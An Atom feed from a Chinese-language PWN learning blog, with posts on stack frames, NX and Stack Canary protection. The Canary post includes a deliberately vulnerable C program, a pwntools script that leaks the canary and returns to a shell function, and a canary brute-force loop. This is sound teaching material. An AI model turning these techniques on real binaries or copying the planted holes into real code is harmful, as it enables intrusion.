<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Rhea&#39;s Blog</title>
  
  
  <link href="https://rhea006.github.io/atom.xml" rel="self"/>
  
  <link href="https://rhea006.github.io/"/>
  <updated>2025-07-01T03:07:41.723Z</updated>
  <id>https://rhea006.github.io/</id>
  
  <author>
    <name>Rhea</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/a143ee4cfc9e.html"/>
    <id>https://rhea006.github.io/2025/07/a143ee4cfc9e.html</id>
    <published>2025-07-01T02:26:53.222Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="RELRO" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/RELRO/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/a2b39843e48c.html"/>
    <id>https://rhea006.github.io/2025/07/a2b39843e48c.html</id>
    <published>2025-07-01T02:19:56.358Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="ASLR和PIE" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/ASLR%E5%92%8CPIE/"/>
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="https://rhea006.github.io/2025/07/7ed5c8bb5686.html"/>
    <id>https://rhea006.github.io/2025/07/7ed5c8bb5686.html</id>
    <published>2025-07-01T02:19:30.783Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="ASLR和PIE" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/ASLR%E5%92%8CPIE/"/>
    
    
  </entry>
  
  <entry>
    <title>栈介绍</title>
    <link href="https://rhea006.github.io/2025/07/d7b458a5691a.html"/>
    <id>https://rhea006.github.io/2025/07/d7b458a5691a.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-01T03:09:44.064Z</updated>
    
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    
  </entry>
  
  <entry>
    <title>栈介绍</title>
    <link href="https://rhea006.github.io/2025/07/a1ac756bd223.html"/>
    <id>https://rhea006.github.io/2025/07/a1ac756bd223.html</id>
    <published>2025-07-01T02:00:00.000Z</published>
    <updated>2025-07-01T03:09:38.545Z</updated>
    
    <content type="html"><![CDATA[<h1 id="基本栈介绍"><a href="#基本栈介绍" class="headerlink" title="基本栈介绍"></a>基本栈介绍</h1><p>栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 (pop) 两种操作，如下图所示（维基百科）。两种操作都操作栈顶，当然，它也有栈底。</p><p><img src="/../../../../../../images/image-20250701104727634.png" alt="image-20250701104727634"></p><p>高级语言在运行时都会被转换为汇编程序，在汇编程序运行过程中，充分利用了这一数据结构。每个程序在运行时都有虚拟地址空间，其中某一部分就是该程序对应的栈，用于保存函数调用信息和局部变量。此外，常见的操作也是压栈与出栈。需要注意的是，<strong><code>程序的栈是从进程地址空间的高地址向低地址增长的</code></strong>。</p><h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="核心组件"><a href="#核心组件" class="headerlink" title="核心组件"></a>核心组件</h2><h3 id="栈指针-SP"><a href="#栈指针-SP" class="headerlink" title="栈指针 (SP)"></a>栈指针 (SP)</h3><ul><li>x86: ESP (32位), x64: RSP (64位)</li><li>始终指向栈顶位置</li><li><code>push/pop</code> 指令自动修改 SP</li></ul><h3 id="基址指针-BP"><a href="#基址指针-BP" class="headerlink" title="基址指针 (BP)"></a>基址指针 (BP)</h3><ul><li>x86: EBP, x64: RBP</li><li>作为当前栈帧的基准点</li><li>用于定位参数和局部变量</li></ul><h3 id="指令指针-IP"><a href="#指令指针-IP" class="headerlink" title="指令指针 (IP)"></a>指令指针 (IP)</h3><ul><li>x86: EIP, x64: RIP</li><li>存储下一条执行指令地址</li><li><code>call/ret</code> 指令修改 IP</li></ul><h2 id="函数调用过程（关键！）"><a href="#函数调用过程（关键！）" class="headerlink" title="函数调用过程（关键！）"></a>函数调用过程（关键！）</h2><h3 id="调用者-Caller-准备"><a href="#调用者-Caller-准备" class="headerlink" title="调用者 (Caller) 准备"></a>调用者 (Caller) 准备</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 参数压栈（从右向左）</span><br><span class="line">push arg3</span><br><span class="line">push arg2</span><br><span class="line">push arg1</span><br><span class="line">; 2. 调用函数</span><br><span class="line">call function  ; 自动压入返回地址(EIP/RIP)</span><br></pre></td></tr></table></figure><h3 id="被调函数-Callee-序言"><a href="#被调函数-Callee-序言" class="headerlink" title="被调函数 (Callee) 序言"></a>被调函数 (Callee) 序言</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function:</span><br><span class="line">; 1. 保存调用者栈帧</span><br><span class="line">push ebp        ; 保存旧EBP</span><br><span class="line">; 2. 建立新栈帧</span><br><span class="line">mov ebp, esp    ; EBP = 当前ESP</span><br><span class="line">; 3. 分配局部变量空间</span><br><span class="line">sub esp, 0x20   ; 分配32字节空间</span><br></pre></td></tr></table></figure><h3 id="栈帧内存布局（32位示例）"><a href="#栈帧内存布局（32位示例）" class="headerlink" title="栈帧内存布局（32位示例）"></a>栈帧内存布局（32位示例）</h3><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">高地址</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数3        | [ebp + 16]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数2        | [ebp + 12]</span><br><span class="line">+-----------------+</span><br><span class="line">|    参数1        | [ebp + 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|    返回地址      | [ebp + 4]  ← 漏洞利用关键点！</span><br><span class="line">+-----------------+</span><br><span class="line">| 保存的EBP       | &lt;-- EBP (当前栈帧基址)</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量1     | [ebp - 4]</span><br><span class="line">+-----------------+</span><br><span class="line">|    局部变量2     | [ebp - 8]</span><br><span class="line">+-----------------+</span><br><span class="line">|     ...         | </span><br><span class="line">+-----------------+</span><br><span class="line">|    临时空间      | &lt;-- ESP (栈顶)</span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h3 id="函数返回过程"><a href="#函数返回过程" class="headerlink" title="函数返回过程"></a>函数返回过程</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">; 1. 返回值存入EAX（约定）</span><br><span class="line">mov eax, return_value</span><br><span class="line">; 2. 释放局部空间</span><br><span class="line">mov esp, ebp    ; ESP = EBP</span><br><span class="line">; 3. 恢复调用者栈帧</span><br><span class="line">pop ebp         ; 恢复旧EBP</span><br><span class="line">; 4. 返回到调用者</span><br><span class="line">ret             ; 弹出返回地址到EIP</span><br></pre></td></tr></table></figure><p>寄存器的图</p><p><img src="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/figure/register.png" alt="img"></p><p>需要注意的是，32 位和 64 位程序有以下简单的区别</p><ul><li>x86<ul><li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li></ul></li><li>x64<ul><li>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</li><li>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</li></ul></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基本栈介绍&quot;&gt;&lt;a href=&quot;#基本栈介绍&quot; class=&quot;headerlink&quot; title=&quot;基本栈介绍&quot;&gt;&lt;/a&gt;基本栈介绍&lt;/h1&gt;&lt;p&gt;栈是一种典型的后进先出 (Last in First Out) 的数据结构，其操作主要有压栈 (push) 与出栈 </summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="栈溢出与ROP" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/"/>
    
    <category term="Stack Overflow" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/"/>
    
    <category term="x86x64" scheme="https://rhea006.github.io/categories/PWN/Learning/%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B8%8EROP/Stack-Overflow/x86x64/"/>
    
    
  </entry>
  
  <entry>
    <title>NX</title>
    <link href="https://rhea006.github.io/2025/06/7061e081f5fe.html"/>
    <id>https://rhea006.github.io/2025/06/7061e081f5fe.html</id>
    <published>2025-06-30T14:00:00.000Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>​No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellcode时，CPU就会抛出异常。通常我们使用可执行空间保护(executable space protection)作为一个统称，来描述这种防止传统代码注入攻击的技术——攻击者将恶意代码注入正在运行的程序中，然后使用内存损坏漏洞将控制流重定向到该代码。实施这种保护的技术有多种名称，在 Windows上称为数据执行保护(DEP)，在Linux上则有 NX、WX、Pax和 Exec Shield 等。</p><p>​NX的实现需要结合软件和硬件共同完成。首先在硬件层面，它利用处理器的NX位，对相应页表项中的第63位进行设置，设置为1表示内容不可执行，设置为0则表示内容可执行。一旦程序计数器(PC)被放到受保护的页面内，就会触发硬件层面的异常。其次，在软件层面，操作系统需要支持 NX，以便正确配置页表，但有时这会给自修改代码或者动态生成的代码(JT编译代码)带来一些问题，这在浏览器上很常见。这时，软件需要使用适当的API来分配内存，例如Wimdows上使用 VirtualProtect 或 VirtualAlloc,Linux上使用mprotect或者 mmap，这些 API 允许更改已分配页面的保护级别。</p><p>​在 Linux 中，当装载器将程序装载进内存空间后，将程序的.text节标记为可执行，而其余的数据段(.data、.bss等)以及栈、堆均为不可执行。因此，传统的通过修改GOT来执行shellcode 的方式不再可行。但NX这种保护并不能阻止攻击者通过代码重用来进行攻击(ret2libc)。</p><p>​如下所示，Ubuntu 中已经默认启用了NX。GNUSTACK段在禁用NX时权限为RWE，而开启<br>后权限仅为 RW，不可执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc zexecstack hello,c &amp;&amp; readelf -l a.out | grep-A1 GNU STACK # 禁用</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h1&gt;&lt;p&gt;​	No-eXecute(NX)，表示不可执行，其原理是将数据所在的内存页(例如堆和栈)标识为不可执行，如果程序产生溢出转入执行shellc</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
    <category term="Learning" scheme="https://rhea006.github.io/categories/PWN/Learning/"/>
    
    <category term="Linux安全机制" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/"/>
    
    <category term="No-eXecute" scheme="https://rhea006.github.io/categories/PWN/Learning/Linux%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/No-eXecute/"/>
    
    
  </entry>
  
  <entry>
    <title>Canary</title>
    <link href="https://rhea006.github.io/2025/06/3a2170f3b1a8.html"/>
    <id>https://rhea006.github.io/2025/06/3a2170f3b1a8.html</id>
    <published>2025-06-30T14:00:00.000Z</published>
    <updated>2025-07-01T03:07:41.723Z</updated>
    
    <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SSP安全机制，有时也叫作Stack cookie。Canary 的值是栈上的一个随机数，在程序启动时随机生成并保存在比函数返回地址更低的位置。由干栈溢出从低地址向高地址进行覆盖，因此攻击者要想控制函数的返回指针，就一定要先盖到Canary。程序只需要在函数返回前检查Canary是否被篡改，就可以达到保护的目的。</p><h1 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h1><h2 id="简单程序"><a href="#简单程序" class="headerlink" title="简单程序"></a>简单程序</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">10</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h2><p>可以在 GCC 中使用以下参数设置 Canary:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong 增加对包含局部数组定义和地址引用的函数的保护</span><br><span class="line">-fstack-protector-explicit 只对有明确 stack_protect attribute 的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护</span><br><span class="line"># 无栈保护</span><br><span class="line">$ gcc -fno-stack-protector canary.c -o fno.out #gcc -fno-stack-protector -o no_canary canary.c</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./fno.out</span><br><span class="line">$ Segmentation fault (core dumped)</span><br><span class="line"># 基础/最强栈保护</span><br><span class="line">$ gcc -fstack-protector -o with_canary canary.c(gcc -fstack-protector-strong -o strong_canary canary.c) #gcc -fstack-protector canary.c -o f.out</span><br><span class="line">$ python -c &#x27;print(&quot;A&quot;*30)&#x27; | ./f.out</span><br><span class="line">$ *** stack smashing detected ***: terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 编译带canary保护的版本</span><br><span class="line">gcc -fstack-protector -o with_canary canary.c</span><br><span class="line"></span><br><span class="line"># 检查文件是否生成</span><br><span class="line">ls -l with_canary</span><br><span class="line">-rwxr-xr-x 1 ubuntu ubuntu 16024 Jun 30 16:13 with_canary</span><br><span class="line"></span><br><span class="line">gdb -q ./with_canary -ex &quot;disassemble main&quot; -ex &quot;q&quot;</span><br><span class="line"></span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000001169 &lt;+0&gt;:endbr64</span><br><span class="line">   0x000000000000116d &lt;+4&gt;:push   rbp</span><br><span class="line">   0x000000000000116e &lt;+5&gt;:mov    rbp,rsp</span><br><span class="line">   0x0000000000001171 &lt;+8&gt;:sub    rsp,0x20</span><br><span class="line">   `0x0000000000001175 &lt;+12&gt;:mov    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x000000000000117e &lt;+21&gt;:mov    QWORD PTR [rbp-0x8],rax`</span><br><span class="line">   0x0000000000001182 &lt;+25&gt;:xor    eax,eax</span><br><span class="line">   0x0000000000001184 &lt;+27&gt;:lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000001188 &lt;+31&gt;:mov    rsi,rax</span><br><span class="line">   0x000000000000118b &lt;+34&gt;:lea    rax,[rip+0xe72]        # 0x2004</span><br><span class="line">   0x0000000000001192 &lt;+41&gt;:mov    rdi,rax</span><br><span class="line">   0x0000000000001195 &lt;+44&gt;:mov    eax,0x0</span><br><span class="line">   0x000000000000119a &lt;+49&gt;:call   0x1070 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x000000000000119f &lt;+54&gt;:nop</span><br><span class="line">   `0x00000000000011a0 &lt;+55&gt;:mov    rax,QWORD PTR [rbp-0x8]`</span><br><span class="line">   `0x00000000000011a4 &lt;+59&gt;:sub    rax,QWORD PTR fs:0x28`</span><br><span class="line">   `0x00000000000011ad &lt;+68&gt;:je     0x11b4 &lt;main+75&gt;`</span><br><span class="line">   `0x00000000000011af &lt;+70&gt;:call   0x1060 &lt;__stack_chk_fail@plt&gt;`</span><br><span class="line">   0x00000000000011b4 &lt;+75&gt;:leave</span><br><span class="line">   0x00000000000011b5 &lt;+76&gt;:ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure><h2 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h2><p>开启 Canary 保护的 stack 结构大概如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | local variables |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure><p>当程序启用 Canary 编译后，在函数序言部分会取 fs 寄存器 0x28 处的值，存放在栈中 %ebp-0x8 的位置。 这个操作即为向栈中插入 Canary 值，代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure><p>在函数返回之前，会将该值取出，并与 fs:0x28 的值进行异或。如果异或的结果为 0，说明 Canary 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure><p>如果 Canary 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 glibc 中的函数，默认情况下经过 ELF 的延迟绑定，定义如下。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eglibc-2.19/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) __stack_chk_fail (void)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (&quot;stack smashing detected&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)</span><br><span class="line">&#123;</span><br><span class="line">  /* The loop is added only to keep gcc happy.  */</span><br><span class="line">  while (1)</span><br><span class="line">    __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;,</span><br><span class="line">                    msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这意味可以通过劫持 <code>__stack_chk_fail</code> 的 got 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容 (参见 stack smash)。</p><p>进一步，对于 Linux 来说，fs 寄存器实际指向的是当前栈的 TLS 结构，fs:0x28 指向的正是 stack_guard。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">typedef struct</span><br><span class="line">&#123;</span><br><span class="line">  void *tcb;        /* Pointer to the TCB.  Not necessarily the</span><br><span class="line">                       thread descriptor used by libpthread.  */</span><br><span class="line">  dtv_t *dtv;</span><br><span class="line">  void *self;       /* Pointer to the thread descriptor.  */</span><br><span class="line">  int multiple_threads;</span><br><span class="line">  uintptr_t sysinfo;</span><br><span class="line">  uintptr_t stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; tcbhead_t;</span><br></pre></td></tr></table></figure><p>如果存在溢出可以覆盖位于 TLS 中保存的 Canary 值那么就可以实现绕过保护机制。</p><p>事实上，TLS 中的值由函数 security_init 进行初始化。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static void</span><br><span class="line">security_init (void)</span><br><span class="line">&#123;</span><br><span class="line">  // _dl_random的值在进入这个函数的时候就已经由kernel写入.</span><br><span class="line">  // glibc直接使用了_dl_random的值并没有给赋值</span><br><span class="line">  // 如果不采用这种模式, glibc也可以自己产生随机数</span><br><span class="line"></span><br><span class="line">  //将_dl_random的最后一个字节设置为0x0</span><br><span class="line">  uintptr_t stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  // 设置Canary的值到TLS中</span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = NULL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//THREAD_SET_STACK_GUARD宏用于设置TLS</span><br><span class="line">#define THREAD_SET_STACK_GUARD(value) \</span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure><h2 id="Canary-绕过技术"><a href="#Canary-绕过技术" class="headerlink" title="Canary 绕过技术"></a>Canary 绕过技术</h2><h3 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h3><p>Canary 是一种十分有效的解决栈溢出问题的漏洞缓解措施。但是并不意味着 Canary 就能够阻止所有的栈溢出利用，在这里给出了常见的存在 Canary 的栈溢出利用思路，请注意每种方法都有特定的环境要求。</p><h3 id="泄露栈中的-Canary"><a href="#泄露栈中的-Canary" class="headerlink" title="泄露栈中的 Canary"></a>泄露栈中的 Canary</h3><p>Canary 设计为以字节 <code>\x00</code> 结尾，本意是为了保证 Canary 可以截断字符串。 泄露栈中的 Canary 的思路是覆盖 Canary 的低字节，来打印出剩余的 Canary 部分。 这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露 Canary，之后再次溢出控制执行流程。</p><h4 id="利用示例"><a href="#利用示例" class="headerlink" title="利用示例"></a>利用示例</h4><p>存在漏洞的示例源代码如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// ex2.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">void getshell(void) &#123;</span><br><span class="line">    system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line">void init() &#123;</span><br><span class="line">    setbuf(stdin, NULL);</span><br><span class="line">    setbuf(stdout, NULL);</span><br><span class="line">    setbuf(stderr, NULL);</span><br><span class="line">&#125;</span><br><span class="line">void vuln() &#123;</span><br><span class="line">    char buf[100];</span><br><span class="line">    for(int i=0;i&lt;2;i++)&#123;</span><br><span class="line">        read(0, buf, 0x200);</span><br><span class="line">        printf(buf);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">int main(void) &#123;</span><br><span class="line">    init();</span><br><span class="line">    puts(&quot;Hello Hacker!&quot;);</span><br><span class="line">    vuln();</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译为 32bit 程序并关闭 PIE 保护 （默认开启 NX，ASLR，Canary 保护）</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ gcc -m32 -no-pie ex2.c -o ex2</span><br></pre></td></tr></table></figure><p>首先通过覆盖 Canary 最后一个 <code>\x00</code> 字节来打印出 4 位的 Canary 之后，计算好偏移，将 Canary 填入到相应的溢出位置，实现 Ret 到 getshell 函数中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context.binary = &#x27;ex2&#x27;</span><br><span class="line">#context.log_level = &#x27;debug&#x27;</span><br><span class="line">io = process(&#x27;./ex2&#x27;)</span><br><span class="line"></span><br><span class="line">get_shell = ELF(&quot;./ex2&quot;).sym[&quot;getshell&quot;]</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Hello Hacker!\n&quot;)</span><br><span class="line"></span><br><span class="line"># leak Canary</span><br><span class="line">payload = &quot;A&quot;*100</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;A&quot;*100)</span><br><span class="line">Canary = u32(io.recv(4))-0xa</span><br><span class="line">log.info(&quot;Canary:&quot;+hex(Canary))</span><br><span class="line"></span><br><span class="line"># Bypass Canary</span><br><span class="line">payload = &quot;\x90&quot;*100+p32(Canary)+&quot;\x90&quot;*12+p32(get_shell)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="one-by-one-爆破-Canary"><a href="#one-by-one-爆破-Canary" class="headerlink" title="one-by-one 爆破 Canary"></a>one-by-one 爆破 Canary</h3><p>对于 Canary，虽然每次进程重启后的 Canary 不同 (相比 GS，GS 重启后是相同的)，但是同一个进程中的不同线程的 Canary 是相同的， 并且 通过 fork 函数创建的子进程的 Canary 也是相同的，因为 fork 函数会直接拷贝父进程的内存。我们可以利用这样的特点，彻底逐个字节将 Canary 爆破出来。 在著名的 offset2libc 绕过 linux64bit 的所有保护的文章中，作者就是利用这样的方式爆破得到的 Canary: 这是爆破的 Python 代码:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print &quot;[+] Brute forcing stack canary &quot;</span><br><span class="line"></span><br><span class="line">start = len(p)</span><br><span class="line">stop = len(p)+8</span><br><span class="line"></span><br><span class="line">while len(p) &lt; stop:</span><br><span class="line">   for i in xrange(0,256):</span><br><span class="line">      res = send2server(p + chr(i))</span><br><span class="line"></span><br><span class="line">      if res != &quot;&quot;:</span><br><span class="line">         p = p + chr(i)</span><br><span class="line">         #print &quot;\t[+] Byte found 0x%02x&quot; % i</span><br><span class="line">         break</span><br><span class="line"></span><br><span class="line">      if i == 255:</span><br><span class="line">         print &quot;[-] Exploit failed&quot;</span><br><span class="line">         sys.exit(-1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">canary = p[stop:start-1:-1].encode(&quot;hex&quot;)</span><br><span class="line">print &quot;   [+] SSP value is 0x%s&quot; % canary</span><br></pre></td></tr></table></figure><h3 id="劫持-stack-chk-fail-函数"><a href="#劫持-stack-chk-fail-函数" class="headerlink" title="劫持__stack_chk_fail 函数"></a>劫持__stack_chk_fail 函数</h3><p>已知 Canary 失败的处理逻辑会进入到 <code>__stack_chk_fail</code>ed 函数，<code>__stack_chk_fail</code>ed 函数是一个普通的延迟绑定函数，可以通过修改 GOT 表劫持这个函数。</p><p>参见 ZCTF2017 Login，利用方式是通过 fsb 漏洞篡改 <code>__stack_chk_fail</code> 的 GOT 表，再进行 ROP 利用</p><h3 id="覆盖-TLS-中储存的-Canary-值"><a href="#覆盖-TLS-中储存的-Canary-值" class="headerlink" title="覆盖 TLS 中储存的 Canary 值"></a>覆盖 TLS 中储存的 Canary 值</h3><p>已知 Canary 储存在 TLS 中，在函数返回前会使用这个值进行对比。当溢出尺寸较大时，可以同时覆盖栈上储存的 Canary 和 TLS 储存的 Canary 实现绕过。</p><p>参见 StarCTF2018 babystack</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;介绍&quot;&gt;&lt;a href=&quot;#介绍&quot; class=&quot;headerlink&quot; title=&quot;介绍&quot;&gt;&lt;/a&gt;介绍&lt;/h1&gt;&lt;p&gt;Stack Canaries(取名自地下煤矿的金丝雀，因为它能比矿工更早地发现煤气泄漏，有预警的作用)是一种用于对抗栈溢出攻击的技术，即SS</summary>
      
    
    
    
    <category term="PWN" scheme="https://rhea006.github.io/categories/PWN/"/>
    
